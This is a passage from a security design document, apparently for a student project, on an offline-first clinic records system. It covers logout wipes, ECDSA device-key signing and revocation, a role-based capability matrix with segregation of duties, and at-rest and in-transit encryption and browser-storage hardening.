| 3 | **Wipe the local replica** | Delete the Dexie database in full (patients, encounters, vitals, invoices, outbox, `local_credentials`). Use `Dexie.delete(dbName)`, then reload the app so no stale in-memory query results survive. |
| 4 | Ensure the outbox is empty first | If `outbox.count() > 0`, warn: "N records have not been synced. Syncing now…" and attempt a push. If it fails, offer an explicit "log out and keep N unsynced records" choice — with the consequence spelled out. Never silently destroy a shift's work, but never silently keep the replica either. |
| 5 | Null the device key handle | The `CryptoKey` reference is dropped. See §4 for why the wrapped key material may remain so that the *device*, not the user, is still identifiable. |
| 6 | Keep on device after logout | Only: device ID, device public key (and, if you implement wrapped-key storage, the encrypted private key blob), and non-clinical preferences. **Nothing that identifies a patient.** |

**Why a full wipe on logout rather than "keep it for next time"?** Because the alternative means patient data sits on the device between shifts, readable by whoever next opens the browser. The wipe is cheap (a resync refills it) and it is the control the deployment checklist depends on. If a PHC insists on sub-second re-login, offer the middle ground in §6.4 as a **policy option**, not a default.

**Admin action: "clear local replica" (decommissioning a device)**

For a device that is being retired, sold, repaired, or handed to another user:

```
POST /admin/devices/:id/clear
  → 1. revoke refresh token families for every session on this device
  → 2. mark device revoked (it can no longer sign a push)          [§4.5]
  → 3. queue a `wipe_local_replica` control message for delivery on the
       device's next `GET /sync/pull`
  → 4. if the device does not check in within N days, mark it
       `presumed_offline_compromised` in the admin device list
  → 5. audit_logs entry: actor, device, reason
```

The honest limitation: **you cannot remotely wipe a device that never comes back online.** The control message is delivered on next check-in, and if there is no next check-in there is no wipe. This is why (a) full-disk encryption is mandatory and (b) the admin UI must show "last seen" prominently, so a device that has been offline for 30 days is visibly a problem rather than invisibly one. In production: an MDM platform or OS-level remote wipe. Say that in your report.

---

## 4. Device identity and revocation

### 4.1 Why a device key at all, given a JWT already authenticates the user

Because the two answer different questions, and the offline replica forces the distinction:

| Question | Answered by | Revoked by |
|---|---|---|
| "Is this a valid, unexpired session for this user?" | JWT access token | Token expiry, denylist, session revocation |
| "Is this *the same physical machine* the session was issued to, and is it still trusted?" | ECDSA P-256 device signature | Device revocation |

With full offline replication, **a device is a data store**. If only the user is revocable, then losing a laptop means you must lock the human's account — which locks them out of every other workstation too, and punishes the wrong party. Device keys give you a surgical lever: revoke the laptop, keep the nurse working. This is the exact reasoning in architecture §5 and §9, and it is the strongest single justification for the added complexity.

A device key also raises the bar for **T4**: a stolen bearer token alone is no longer enough to push records, because the attacker also needs the private key, which lives in IndexedDB on the machine they may not have.

### 4.2 Keypair generation

At first run on a device — before or during first login — generate an **ECDSA P-256** keypair with WebCrypto:

```ts
// web/src/sync/deviceKey.ts
export interface DeviceKeyHandle {
  deviceId: string;              // uuidv7, minted once per browser profile
  keyPair: CryptoKeyPair | null; // in-memory; may be null after a reload
  publicKeyB64: string;          // base64url SPKI — sent to the server
  algorithm: 'ES256';            // ECDSA P-256 + SHA-256
}

// WebCrypto signs with ECDSA; the curve is fixed at P-256.
const GEN_ALGO  = { name: 'ECDSA', namedCurve: 'P-256' } as const;
const SIGN_ALGO = { name: 'ECDSA', hash: 'SHA-256' } as const;

export async function generateDeviceKey(): Promise<DeviceKeyHandle> {
  if (!crypto?.subtle?.generateKey) {
    // crypto.subtle is undefined outside a secure context. On plain HTTP over a
    // LAN this silently breaks device identity — deploy HTTPS, even internally.
    throw new Error('WebCrypto unavailable — the app requires a secure context (HTTPS or localhost)');
  }

  const keyPair = (await crypto.subtle.generateKey(
    GEN_ALGO,
    true,                       // extractable: see the note below
    ['sign', 'verify'],
  )) as CryptoKeyPair;

  // P-256 public keys export as 'spki' (DER), NOT 'raw'. Requesting 'raw' throws.
  const spki = new Uint8Array(await crypto.subtle.exportKey('spki', keyPair.publicKey));

  return {
    deviceId: uuidv7(),
    keyPair,
    publicKeyB64: base64url(spki),
    algorithm: 'ES256',
  };
}
```

> **Why ECDSA P-256 and not Ed25519.** Ed25519 in WebCrypto landed later than the rest of the API and is still unavailable in older browsers — exactly the browsers you will meet on an ageing PHC workstation. P-256 has been in `crypto.subtle` since the beginning, is universally supported, and is FIPS-approved. It is also what `07-API-CONTRACT.md` and `02-SYNC-PROTOCOL.md` specify, so all documents agree.
>
> **Go-side interop trap.** WebCrypto emits ECDSA signatures in **ASN.1 DER** form, not the raw fixed-width `r‖s` concatenation. Verify with `ecdsa.VerifyASN1`, **not** `ecdsa.Verify`. Using the wrong one produces a signature that is perfectly valid and always fails verification, which is a genuinely confusing hour to lose.

**Why not HMAC with a shared secret.** A symmetric device key is a secret the server also holds, which destroys the non-repudiation property that makes device signatures worth having at all. An attacker who compromises the server could then forge any device's signature. Asymmetric keys keep the signing capability on the device alone.

**The extractability problem — be honest about it.** WebCrypto can generate a non-extractable private key (`extractable = false`), which is the stronger choice: the key bytes can never be read by JavaScript. But a non-extractable `CryptoKey` **cannot be persisted to IndexedDB** in any useful way across page reloads and browser restarts, because the key material cannot be exported. Your options:

| Option | Security | Practicality | Recommendation |
|---|---|---|---|
| **A. Non-extractable, in-memory only** | Strongest — key bytes never exposed to JS | Device must re-register a key after every full browser restart; every restart looks like a new device to the server | Too disruptive for a PHC workstation that reboots daily |
| **B. Extractable, JWK stored in IndexedDB** | Weaker — any JS on the origin can read the key; an attacker with the file has the key | Works everywhere, survives reloads | **Choose this, and say why** |
| **C. Extractable, but the exported JWK is AES-GCM-wrapped under a key derived from the offline verifier** | Middle — reading the file is not enough; you also need the user's password | Survives reloads; breaks if the user forgets their password; needs careful handling of "which user's key is this" | The production answer; overkill for the project unless you have time |
| **D. Non-extractable with `structuredClone` persistence** | Strongest where supported | Browser support is uneven and the behaviour differs between Chrome and Firefox | Not worth the debugging time in a student project |

**Recommendation: Option B, with the reasoning written into your report.** The device private key protects against an attacker who *has a token but not the machine*. Against an attacker who has the machine, FDE and revocation are the real controls, and a non-extractable key would not have saved you — they have the whole replica anyway. Choosing B and explaining the trade-off is worth more marks than choosing A and shipping a device that re-registers on every reboot. Note Option C as what you would do in production.

**Exporting to JWK for storage.** Option B stores the private key as an exported JWK. Keep the JWK's own `crv`/`kty` fields intact and never hand-build the object — import failures from a malformed JWK are silent and infuriating:

```ts
const jwk = await crypto.subtle.exportKey('jwk', keyPair.privateKey);
// Persist to IndexedDB. On reload:
const restored = await crypto.subtle.importKey(
  'jwk', jwk, GEN_ALGO, false, ['sign'],   // re-import as NON-extractable
);
```

Note the `false` on re-import: the key only needs to be extractable **once**, at creation, in order to be stored. After that it can be non-extractable for the rest of its life. That is a small, free hardening step worth taking.

### 4.3 Device registration

A device row is created **at login**, so `last_seen_at` and the session binding exist from the
first request. At that point it has **no public key** — it has not yet proved possession of one.
Registration is the separate step that binds the key:

```
POST /api/v1/devices             (authenticated: valid access token)
{
  "deviceId":   "0192f7…",                    // optional; must equal the token's device_id
  "publicKey":  "<base64url SPKI P-256>",
  "algorithm":  "ES256",
  "label":      "Triage laptop 2",
  "platform":   "Windows 11 / Chrome 141",
  "appVersion": "1.4.2"
}
```

| Step | Server action |
|---|---|
| 1 | Verify the JWT. The device acted on is the **token's** `device_id`; a different `deviceId` in the body is a 400, not something to honour. |
| 2 | Parse the key as SPKI and require the P-256 curve. Reject anything that does not parse, before any write. |
| 3 | Refuse a **revoked** device (`403 DEVICE_REVOKED`). Re-registration after revocation needs a human, or the control is one click. |
| 4 | **First write wins.** A device with no key gets this one. A device that already has a key: the same key returns 200 (idempotent retry), a different key returns `409 CONFLICT`. Without that rule, a stolen token could swap in an attacker's key and every later push would verify. |
| 5 | Compute the **fingerprint server-side** from the decoded DER (SHA-256, lowercase hex). Never accept a client-supplied fingerprint — it proves nothing and could make two distinct keys look like one. |
| 6 | Write `audit_logs` (when that table lands in Sprint 6): actor, `device_id`, and the **first 16 hex chars** of the fingerprint — never the whole key, and never the private key, which the server never sees. Today the device row's own `created_at`/`updated_at` are the trail. |
| 7 | Return the device record with `registered`, `revoked` and `publicKeyFingerprint`. |

There is **no `status` column** and no `device_owners` table. `01-DATA-MODEL.md` is canonical for
the schema: a device is revoked iff `revoked_at IS NOT NULL`, and the user↔device pairing lives on
`refresh_tokens`, one row per session. A "pending approval" state would need a migration and is
recorded as future work.

The admin device list shows: label, public-key fingerprint, registered date, **last seen**, last
sync, revoked state, and a revoke button. "Last seen" is the field that turns an abstract risk into
an operational one.

### 4.4 The canonical string that gets signed

Every `/sync/push` is signed. The signature must cover everything that determines the effect of the request, so that no part of it can be altered in flight or replayed into a different context.

**Exact construction — newline-delimited, UTF-8, in this order:**

```
<HTTP METHOD, uppercase>
<PATH, exactly as sent, including the leading slash, without the query string>
<DEVICE_ID, the uuid from the access token's device_id claim>
<DEVICE_TIMESTAMP, the ISO-8601 string sent in X-Device-Timestamp, verbatim>
<NONCE, 32 random bytes, base64url>
<base64url-unpadded SHA-256 of the raw request body bytes>
```

Rendered as one string with `\n` separators and **no trailing newline**. This is the exact construction specified in `02-SYNC-PROTOCOL.md` §5.2 — the two documents must never drift, because a one-character difference yields a signature that is valid and always fails verification:

```
POST\n/api/v1/sync/push\n0192f7a1-…\n2026-02-14T09:31:07.221Z\nkQ7v…Xw\nb64url(sha256(rawBody))
```

Why each field is present:

| Field | Why it cannot be omitted |
|---|---|
| `METHOD` | Stops a signature for a harmless `GET` being replayed as a state-changing `POST`. |
| `PATH` | Stops a signature for `/sync/pull` being replayed at `/sync/push`. Include the path **exactly** as sent — no normalisation, no trailing-slash guessing; the server must verify against the raw `c.Request.URL.Path`. |
| `DEVICE_ID` | Binds the signature to the claimed device, so a signature from device A cannot be presented as device B's. |
| `TIMESTAMP` | Bounds the replay window to ±5 minutes. Send the ISO-8601 string **verbatim** in `X-Device-Timestamp` and use that same string here — do not re-serialise it, or a formatting difference will break verification. |
| `NONCE` | Makes two otherwise-identical requests distinct, so replaying a captured request inside the window still fails. |
| **Body SHA-256** | Binds the entire payload. This is the important one: it lets you sign a short, fixed-length string instead of a multi-megabyte body, while still covering every byte of it. **base64url-encoded**, not hex. Compare digests in constant time. |

> **A note for your report.** This construction has no domain-separation prefix. That is safe here because the key is used for exactly one purpose — signing sync pushes — and is never reused for another protocol. If you ever reuse a device key for something else, add a fixed prefix (e.g. `PHC-SYNC-V1`) as the first field and bump the schema version. Naming that as a deliberate, conditional decision reads better than adding a prefix you cannot justify.

Do **not** put the body's *parsed* form in the canonical string (JSON key order is not stable, and re-serialising is a source of bugs). Hash the raw bytes exactly as received, before any unmarshalling — read the body once into a `[]byte`, hash that, then unmarshal.

**Client side (WebCrypto):**

```ts
// web/src/sync/sign.ts
export async function signSyncRequest(
  key: CryptoKey,
  algorithm: 'ES256',                 // ECDSA P-256 + SHA-256
  method: string,
  path: string,
  deviceId: string,
  body: Uint8Array,
): Promise<{ signature: string; timestamp: string; nonce: string }> {
  const bodyHash = await crypto.subtle.digest('SHA-256', body);
  const timestamp = new Date().toISOString();   // ISO-8601 string, sent verbatim
  const nonceBytes = crypto.getRandomValues(new Uint8Array(32));
  const nonce = base64url(nonceBytes);

  // EXACTLY the six fields, in this order, joined by "\n". This must match
  // 02-SYNC-PROTOCOL.md §5.2 byte for byte — a single-character divergence
  // produces a signature that is valid and always fails verification.
  const canonical = [
    method.toUpperCase(),
    path,
    deviceId,
    timestamp,
    nonce,
    base64url(new Uint8Array(bodyHash)),   // base64url of the SHA-256, NOT hex
  ].join('\n');

  const signature = await crypto.subtle.sign(
    { name: 'ECDSA', hash: 'SHA-256' } as AlgorithmIdentifier,
    key,
    new TextEncoder().encode(canonical),
  );

  return { signature: base64url(new Uint8Array(signature)), timestamp, nonce };
}
```

**Server side (Go middleware).**

The implementation lives in `api/internal/http/middleware/device_signature.go`, with the
canonical string and the signature check in `api/internal/platform/devicekey`. It is reproduced
here in outline; the code is the authority.

```go
// Order matters: RequireAuth runs first so the device id comes from the VERIFIED
// JWT claim, never from a header the client chooses.
func DeviceSignature(lookup DeviceLookup, nonces nonce.Cache, maxSkew time.Duration) gin.HandlerFunc {
    return func(c *gin.Context) {
        deviceID, ok := DeviceIDFrom(c) // from the JWT claim, NOT from a header
        // ... require X-Device-Signature, X-Device-Timestamp, X-Device-Nonce

        // Parse to CHECK the window, but sign over the ORIGINAL string:
        // re-formatting it would change the bytes the client signed.
        sentAt, err := time.Parse(time.RFC3339Nano, timestamp)
        if err != nil || time.Since(sentAt).Abs() > maxSkew {
            // CLOCK_SKEW, not SIGNATURE_INVALID — otherwise a wrong clock sends
            // someone hunting a key bug.
        }

        canonical := devicekey.CanonicalString(
            c.Request.Method,
            c.Request.URL.Path, // exactly as sent; no query string, no normalisation
            deviceID.String(),
            timestamp,
            deviceNonce,
            rawBody,            // captured BEFORE JSON parsing
        )

        dev, err := lookup(c.Request.Context(), deviceID)
        // unknown and revoked collapse to one 403 DEVICE_REVOKED, so a caller
        // cannot confirm that a device id exists
        if dev.PublicKey == "" {
            // DEVICE_KEY_NOT_REGISTERED: every device is in this state between
            // login and POST /devices
        }

        if err := devicekey.Verify(pub, []byte(canonical), signature); err != nil {
            // DEVICE_SIGNATURE_INVALID
        }

        // Consume the nonce only AFTER the signature verifies, so a flood of
        // unsigned requests cannot fill the cache and evict legitimate nonces.
        if !nonces.Consume(deviceID.String()+":"+deviceNonce, 2*maxSkew, time.Now()) {
            // 409 DEVICE_NONCE_REPLAYED
        }

        c.Next()
    }
}
```

`devicekey.Verify` accepts both the ASN.1 DER encoding that browsers produce and the raw
`r||s` (P1363) encoding that some embedded WebCrypto runtimes emit — see the package comment
and `devicekey_test.go`, which pins a signature produced outside Go.

#### 4.4.1 Replay prevention

Two independent mechanisms, because either alone is insufficient:

| Mechanism | Rejects | Weakness alone |
|---|---|---|
| **Timestamp window (±5 min)** | Old captures, replay after a delay | An attacker who captures and replays within the window succeeds |
| **Nonce cache (Redis or a Postgres table)** | Any replay at all, including inside the window | Requires storage and a TTL; a cache miss (eviction) reopens the window |
| **Idempotent operation IDs** | *Legitimate* retries creating duplicate records | Does not distinguish a retry from a malicious duplicate — it just makes the effect happen once |

Together: an attacker must capture a request, present it within 120 s, with a nonce the server has not seen, signed by a key they do not have. That is a meaningfully hard position.

Implementation notes that will save you an afternoon:

- **Key the nonce cache by `device_id:nonce`**, not by nonce alone. Otherwise two devices that happen to generate the same nonce (it will not happen with 32 random bytes, but) interfere with each other.
- **TTL = 2 × the acceptance window** (so 240 s). A nonce that expires from the cache must also be outside the timestamp window, or the window reopens.
- **Consume the nonce after signature verification**, never before — otherwise an unauthenticated flood can evict legitimate nonces from the cache and cause false rejections. (The snippet above does this deliberately; the ordering is a security decision, not style.)
- **Reject non-monotonic clocks per device.** If a device's timestamps jump backwards by more than the window, flag it (T7) rather than silently accepting.
- **Only `POST /sync/push` requires the device signature.** `GET /sync/pull` is read-only and JWT-only: it is still authenticated, still rate-limited, still logged. Justify this in your report — signing pulls costs a round-trip of CPU for no integrity benefit, and the pull is where a cold-start timeout is most likely (architecture §3.3). If you have time, sign pulls too; it is strictly better and only costs latency.

### 4.5 Revocation

```
POST /admin/devices/:id/revoke
{ "reason": "laptop stolen from records room 2026-01-14" }
```

| Step | Effect |
|---|---|
| 1 | `devices.status = 'revoked'`, `revoked_at`, `revoked_by`, `revoked_reason` |
| 2 | **All refresh token families** bound to that device are revoked (`revoked_reason = 'device_revoked'`) — immediately, in the same transaction |
| 3 | All access tokens whose `device_id` claim matches are denylisted by `jti` for the remainder of their 15-minute lifetime |
| 4 | Subsequent `POST /sync/push` presents a valid signature but the device row is not `active` → **403 `device_revoked_or_unknown`** |
| 5 | A `wipe_local_replica` control message is queued for delivery if the device ever pulls again (§3.6) |
| 6 | `audit_logs`: `action = 'device.revoked'`, actor, device, reason, and a count of the sessions and tokens revoked |

**Semantics to get right:**

- **Revoking a device does not disable the human's account.** They log in on another workstation and keep working. Losing a laptop should cost you a laptop, not a nurse.
- **Revoking a user disables all their devices.** `POST /admin/users/:id/suspend` revokes every session and marks every owned device `suspended`. When an employee leaves, do both — in that order.
- **Revocation is not deletion.** Keep the row, keep the public key, keep the audit history. You may need to prove later that a given push came from a device that was trusted *at the time*.
- **A revoked device's already-synced data stays.** Revocation stops future writes; it does not retroactively invalidate records that were legitimately created. Deleting clinical data because the hardware was stolen would be worse than the theft.
- **Re-registration after revocation requires admin approval.** Otherwise the whole control is defeated by clicking "register device" again on the same machine. Enforce: a `device_id` with `status = 'revoked'` cannot self-register back to `active`; it needs a human.

---

## 5. Authorisation (RBAC)

### 5.1 The eight roles

From architecture §6: `front_desk`, `nurse`, `doctor`, `lab_scientist`, `pharmacist`, `cashier`, `accountant`, `admin`.

### 5.2 Capability matrix — definitions

| Mark | Meaning |
|---|---|
| **Full** | May perform the capability for any record. |
| **Own** | May perform it only for records they created, or for encounters they are the assigned clinician on. Enforced against the row's `created_by` / `assigned_to`, never against a client-supplied claim. |
| **Read** | Read-only. The write path returns 403. |
| **None** | No access. The service layer returns 403 and writes an audit entry for the attempt. |

### 5.3 Capability matrix

| Capability | front_desk | nurse | doctor | lab_scientist | pharmacist | cashier | accountant | admin |
|---|---|---|---|---|---|---|---|---|
| Register patient | **Full** | None | None | None | None | None | None | **Full** |
| Edit demographics | **Full** | None | **Full** | None | None | None | None | **Full** |
| Record vitals | None | **Full** | **Full** | None | None | None | None | **Full** |
| View vitals | **Read** | **Full** | **Full** | **Read** | **Read** | None | None | **Full** |
| Create encounter | **Full** | **Full** | **Full** | None | None | None | None | **Full** |
| Diagnose | None | None | **Full** | None | None | None | None | None |
| Order lab | None | **Full** | **Full** | None | None | None | None | None |
| Enter lab result | None | None | None | **Full** | None | None | None | None |
| Prescribe | None | None | **Full** | None | None | None | None | None |
| Dispense | None | None | None | None | **Full** | None | None | None |
| Collect payment | None | None | None | None | None | **Full** | None | **Full** |
| Void / reverse payment | None | None | None | None | None | **Own** (reason required) | None | **Full** |
| Reconcile till / daily close | None | None | None | None | None | **Read** (own till only) | **Full** | **Full** |
| Admit patient | None | **Full** | **Full** | None | None | None | None | **Full** |
| Discharge patient | None | None | **Full** | None | None | None | None | **Full** |
| Create referral | None | None | **Full** | None | None | None | None | None |
| Revoke referral | None | None | **Own** | None | None | None | None | **Full** |
| View referral (internal) | **Read** (ID + status only) | **Full** | **Full** | None | None | None | None | **Full** |
| View sensitive-flagged records | None | **Own**, with reason | **Full** | None | **Own**, with reason | None | None | **Full**, audited |
| View audit log | None | None | None | None | None | None | **Read** (financial scope only) | **Full** |
| Manage users | None | None | None | None | None | None | None | **Full** |
| Manage devices | None | None | None | None | None | None | None | **Full** |
| Manage tariffs | None | None | None | None | None | **Read** | **Full** | **Full** |
| View financial reports | None | None | None | None | None | **Read** (own till) | **Full** | **Full** |
| View clinical reports | None | **Read** (aggregate) | **Full** | **Read** (own worklist) | **Read** (aggregate) | None | **Read** (aggregate, de-identified) | **Full** |
| Export data | None | None | None | None | None | None | **Full** (financial, de-identified where possible) | **Full** |

Notes on the non-obvious cells:

- **`accountant` has no payment capability at all.** They can see every financial report and reconcile every till, but cannot take or reverse a single payment. That asymmetry is the whole point; see §5.4.
- **`cashier` reconciles only their own till, read-only.** They can see the drawer they are responsible for; the accountant closes the day.
- **`front_desk` sees referral *status*, not referral *content*.** They need to answer "has the referral been sent?" without reading the clinical note. This is a deliberate minimisation and a good thing to point at in your defence.
- **`nurse` and `pharmacist` get `Own` on sensitive-flagged records.** A nurse recording vitals on a patient whose file is flagged sensitive still needs to do their job; they do not need to browse the rest. "Own" means: the patient is in the encounter they are currently assigned to. Access requires a typed reason and is logged.
- **`admin` has "Full" on clinical capabilities but should not use them.** Admins manage users and devices. In production you would split `admin` into `sysadmin` (no clinical access) and `clinical_admin`. For a student project, keep one admin role but log every clinical action an admin takes, and note the split as a production improvement. Being unable to say why admin has diagnose rights is a bad look in a viva; the honest answer is "convenience for a single-facility deployment, and here is the production fix".
- **`lab_scientist` and `pharmacist` cannot view referrals.** Nothing in their workflow needs it.

### 5.4 Segregation of duties

The principle: **no single person should be able to both create a financial obligation and conceal it.** In a PHC the concrete version is the cash drawer.

| Duty | cashier | accountant | Why the split |
|---|---|---|---|
| Take cash from a patient | **Yes** | No | The person handling cash is the person with the opportunity to skim |
| Issue a receipt number | **Yes** (server-issued sequence) | No | Receipt numbers must be gap-detectable |
| Void or reverse a payment | **Own only**, mandatory reason, audited | No | A cashier who can silently void their own receipt can erase a theft |
| Count the drawer / close the day | **Read own** | **Yes** | The reconciler must not be the collector |
| Adjust a tariff | No | **Yes** | Changing a price changes the expected till total |
| Approve a write-off | No | No (admin only, with reason) | Write-offs are the classic concealment route |

The audit question this answers: **"if a patient says they paid and the system says they did not, who could have made that happen, and who would have noticed?"** With the split, only the cashier could have done it, the accountant would notice at close, and the void reason is in an append-only log. With one role doing both, the answer is "either of them, and nobody".

Enforcement notes:

- `void_payment` on a payment already included in a closed reconciliation requires `admin`. Closed means closed.
- Every void writes an audit row with the original payment ID, the actor, the reason, and the resulting derived balance.
- A daily reconciliation report lists: opening float, payments by method, voids with reasons, expected closing, actual closing, variance. Variances above a threshold email/alert the admin (out of scope: just flag it in the UI).

### 5.5 Where enforcement happens — and why it is not negotiable

**The rule:** *every* capability decision is made in `internal/service/`. Route guards and menu visibility in the SPA are **usability features**, not security controls.

Why this is absolute here, more than in a normal web app:

1. **The attacker owns the frontend.** With a fully replicated offline client, the SPA bundle, its Dexie schema, and its IndexedDB contents are all on a machine the attacker controls. Editing a route guard is a five-second devtools change. Editing the bundle is a `sed`. There is no scenario in which SPA authorisation resists a motivated user.
2. **The API is directly reachable.** The SPA is not a proxy. Anyone with a token can `curl` the API. If the handler does not check, nothing checks.
3. **Offline decisions are advisory.** The SPA must decide *something* offline to render a usable UI. That decision informs the user; it does not bind the server. When the queued operation finally arrives, the server re-decides — and may reject what the client allowed.

**Structural rules that make this hold (from architecture §4.1):**

- Handlers never call repos directly. A handler that reaches past the service has skipped the permission check.
- Repos never contain `if user.Role == "cashier"`. A repo that branches on role has put a security decision in the layer with no context to make it.
- The role and user ID come from the verified JWT context, never from the request body, query string, or a custom header.
- Every "may this happen?" question is answered by a single named function, so there is one place to audit:

```go
// internal/service/authz.go
type Capability string

const (
    CapRegisterPatient Capability = "patient.register"
    CapVoidPayment     Capability = "payment.void"
    CapViewAuditLog    Capability = "audit.view"
    // …
)

// Authorize is the ONLY place a capability decision is made.
// Callers pass the actor from the JWT context and the resource, never a
// client-supplied role or ownership claim.
func (s *Authz) Authorize(ctx context.Context, actor Actor, cap Capability, res Resource) error {
    if actor.UserID == uuid.Nil || !actor.Role.Valid() {
        return domain.ErrUnauthenticated
    }
    if !s.matrix.Allows(actor.Role, cap) {
        s.audit.Denied(ctx, actor, cap, res) // 403s are evidence; log them
        return domain.ErrForbidden
    }
    if s.matrix.Scope(actor.Role, cap) == ScopeOwn && !res.OwnedBy(actor.UserID) {
        s.audit.Denied(ctx, actor, cap, res)
        return domain.ErrForbidden
    }
    return nil
}
```

Two enforcement properties worth testing explicitly:

- **Deny by default.** A capability that is not in the matrix is denied. A new endpoint added without a matrix entry must 403 for everyone, not 200 for everyone. Assert this with a test that enumerates the registered routes and fails if any route has no declared capability.
- **The 403 path is audited.** A user repeatedly hitting endpoints outside their role is one of the few reliable insider-threat signals you have (T3). Log it, count it per user per day, and show it on the admin dashboard.

---

## 6. Data protection and privacy

### 6.1 Data classification

| Class | Definition | Examples in this system | Storage rules | Retention |
|---|---|---|---|---|
| **Public** | Safe to disclose to anyone, no harm from release | Facility name, opening hours, the `/r/:token` route's existence, the build version | Anywhere | Indefinite |
| **Internal** | Harmless in isolation; not for public release | Role names, tariff codes and prices, lab test catalogue, `devices` metadata (labels, fingerprints), aggregate counts | Server and clients; TLS in transit | Indefinite |
| **Confidential** | Personal or operational data; release causes real harm | Patient name, DOB, phone, address, tribe, occupation, marital status, appointment times, invoices, payments, referral access log, `audit_logs` | Server + authorised clients; TLS 1.2+; **FDE mandatory on clients**; excluded from logs | Per policy; clinical records typically years |
| **Restricted** | Release causes severe harm — stigma, discrimination, prosecution | HIV status and related orders/results/dispenses, mental health notes, gender-based-violence notes, substance-use records, credentials, device private keys, referral tokens and PINs, JWT secret, DB credentials | As confidential **plus** narrower RBAC, access-with-reason, per-access audit, no export, not in any log, not in any error message | Minimum necessary; clinical records per legal requirement |

Two rules that make classification mean something:

1. **Anything classified Restricted must have a `sensitive` flag on the row** so the control is enforced by data, not by a developer remembering which tables are sensitive (see §6.7).
2. **Restricted data never appears in a log line, an error message, a stack trace, or a third-party analytics event.** This is a code-review checklist item, not an aspiration (§10.6).

### 6.2 Encryption in transit

| Hop | Requirement | Notes |
|---|---|---|
| Browser → Cloudflare | TLS 1.3 preferred, 1.2 minimum | Cloudflare handles the certificate. Enable **Always Use HTTPS** and **HSTS** (`max-age=31536000; includeSubDomains; preload`) once you are certain about every subdomain. |
| Cloudflare → Cloud Run | TLS (Cloudflare terminates and re-originates) | Use **Full (Strict)** mode. Flexible mode is plaintext on the origin leg and defeats the point. |
| Cloud Run → Neon | TLS, `sslmode=require` | Neon enforces TLS; make it explicit in the connection string rather than relying on the default. |
| Cloudflare **not** in path (direct `*.run.app`) | TLS, still authenticated | The API validates JWTs itself; Cloudflare is defence in depth, not the auth layer. Never assume a request reached you through Cloudflare. |

Notes:

- **The offline case has no transport**, which is why at-rest protection on the device carries so much weight here. Encryption in transit protects the sync window; encryption at rest protects the other 167 hours of the week.
- **Certificate pinning: no.** It is a maintenance trap in a browser context and buys little against the threats in §2.
- **HSTS preload is a one-way door.** Only submit once you are confident you will never need plaintext HTTP on that domain.

### 6.3 Encryption at rest

| Where | Control | Status | Notes |
|---|---|---|---|
| Neon Postgres | Provider-managed AES-256 encryption at rest; encrypted backups | **Provided** | Verify it is enabled for your project rather than assuming. |
| Neon connection secrets | Secret Manager, not env files in the image | **Must build** | §10.1 |
| API container image | No secrets baked in | **Must build** | Anything in the image is readable by anyone who can pull it |
| Cloud Run | Ephemeral disk, no persistent volumes | **Provided** | Statelessness is a security feature here: there is no server-side cache of patient data to steal |
| **PHC workstation** | **Full-disk encryption — mandatory** | **Deployment requirement** | BitLocker (Windows Pro) / LUKS (Linux) / FileVault (macOS). This is the single highest-value control in the entire document (T1). Verify it at enrolment, record it in the device register, and re-verify at each audit. |
| Workstation swap/page file | Encrypted by FDE; disable hibernation if the policy allows | **Deployment requirement** | A password in a page file on an unencrypted disk is a password on an unencrypted disk. |
| Removable media | Prohibited by policy except the encrypted outbox export | **Policy** | Also disable USB mass storage via OS policy where feasible |

**How to actually verify FDE at enrolment** (put this in your deployment runbook — "we told them to" is not a control):

- Windows: `manage-bde -status C:` must report `Protection On` and `Percentage Encrypted: 100%`. Record the output in the device register.
- Linux: `lsblk -f` shows `crypto_LUKS` on the root device; `cryptsetup status` on the mapper.
- macOS: `fdesetup status` reports `FileVault is On.`

### 6.4 What lives in IndexedDB, and why that is acceptable

**The contents of the local replica** — this is the list to show an examiner when they ask "so the whole database is just sitting in the browser?":

| Store | Contents | Classification | Why it must be local |
|---|---|---|---|
| `patients`, `households` | Demographics, identifiers | Confidential | Registration must work offline |
| `encounters`, `triage` | Visit records and workflow state | Confidential | The queue is the core of the offline workflow |
| `vitals` | Observations | Confidential | Recorded at the bedside, often with no signal |
| `diagnoses`, `lab_orders`, `lab_results` | Clinical notes and results | Confidential / Restricted | The consultation must not block on the network |
| `prescriptions`, `dispenses` | What was prescribed and given | Confidential / Restricted | Same |
| `invoices`, `payments`, `tariff` | Money, BIGINT minor units | Confidential | Cash must be collected offline |
| `referrals` | Issued referral metadata | Confidential | A referral is created during a consultation |
| `outbox` | Queued operations with operation IDs | Confidential | The write path (architecture §4.4) |
| `sync_cursor` | Last pulled server cursor | Internal | Resumable pull |
| `local_credentials` | Per-user offline verifier (§3.4) | Restricted | Offline login |
| `device_key` | Device private key material (wrapped or JWK) | Restricted | Sync signing |
| `session` | Refresh token, `offline_deadline` | Restricted | Offline session continuity |
| **`audit_logs`** | **Never present** | — | Audit integrity: a client-writable audit log is not an audit log |

**Why it is acceptable:**

1. It is the **only** way to meet the requirement. An offline-capable clinical system must have the data offline. Every alternative (thin client, server-rendered, terminal services) fails the "no connectivity" requirement outright.
2. The exposure is **bounded and controlled** by three things that stack: FDE (protects the file at rest), the offline grace period (bounds how long an unattended device stays usable), and device revocation (bounds how long a stolen device stays trusted).
3. It is **one origin's** storage, in a browser sandbox, not a world-readable file on a shared drive.

**Hardening requirements for the local replica:**

| Control | Requirement | Rationale |
|---|---|---|
| **Origin isolation** | The app is served from a **dedicated origin** (e.g. `app.phcrecords.example`). No other application, marketing site, or internal tool shares that origin. | IndexedDB is per-origin. Anything else on the origin can read the replica via JS. This is the single most important client-side structural control. |
| **No third-party scripts** | No analytics, no tag managers, no ad code, no third-party chat widgets, no external font/CDN scripts | Every third-party script runs with full access to the same origin — and therefore to every patient record. Vendor compromise, or a malicious release of a legitimately included package, is a full data breach. Self-host fonts and any needed library. |
| **Strict CSP** | `default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'none'; form-action 'self'` — no `unsafe-inline`, no `unsafe-eval` | Blocks injected script from exfiltrating the replica. Note: Tailwind v4 and Vite need `style-src 'self' 'unsafe-inline'` for injected styles; be precise about which directive gets the exception and why. |
| **`Subresource Integrity`** | Any externally loaded asset, if you absolutely must have one, carries an SRI hash | Detect tampering with a third-party asset |
| **No `localStorage` for tokens or clinical data** | Access token in memory (Zustand, non-persisted). No patient data outside Dexie. | `localStorage` is synchronous, string-only, and more exposed to XSS; there is also no reason to have two local stores |
| **Mandatory local-wipe-on-logout policy option** | `LOCAL_WIPE_ON_LOGOUT=true` (default). When `false`, the replica survives logout but `local_credentials` does not, and the device shows a persistent "patient data present on this device" indicator. | A PHC with terrible connectivity may need the middle ground. Make it an explicit, visible policy decision — not an accident. |
